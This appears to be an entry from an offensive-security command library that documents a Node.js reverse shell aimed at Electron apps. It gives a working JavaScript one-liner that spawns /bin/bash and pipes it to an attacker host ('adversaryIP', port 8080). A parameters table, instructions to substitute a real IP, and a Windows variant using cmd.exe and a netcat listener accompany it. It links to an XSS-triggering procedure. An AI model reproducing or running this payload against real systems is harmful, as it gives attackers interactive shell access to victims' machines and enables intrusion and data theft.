---
id: cmd-reverse-shell
data: >-
  var net = require("net"), sh = require("child_process").exec("/bin/bash"); var
  client = new net.Socket(); client.connect(8080, "adversaryIP",
  function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
  sh.stderr.pipe(client);});
tags:
  - reverse-shell
  - rce
type: command
output: null
executor: javascript
platforms:
  - Linux
  - Electron
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.256Z'
verified: false
validated: true
submitted: true
---
# Create Reverse Shell via Node.js net Module

## Command

```javascript
var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(8080, "adversaryIP", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
```

## Description

This JavaScript command creates an interactive reverse shell from the victim's Electron client to the attacker's server using Node.js net and child_process modules, providing bash access with user privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| connect port | Port to connect (8080) | Yes |
| connect host | Attacker IP (adversaryIP) | Yes |
| exec | Shell to execute (/bin/bash) | Yes |
| pipe | Stream binding (stdin/stdout/stderr) | Yes |

## Examples

### Basic Usage

Replace "adversaryIP" with actual IP and run in external JS.

### Advanced Usage

Adapt for Windows: exec("cmd.exe") and connect to netcat listener.

## Expected Output

Establishes a reverse shell connection from the victim to the attacker's server on port 8080.

## Related

- [[procedures/Trigger-XSS-by-Previewing-Note]]
- [[commands/spawn-process-via-electron-process-api-linux]]
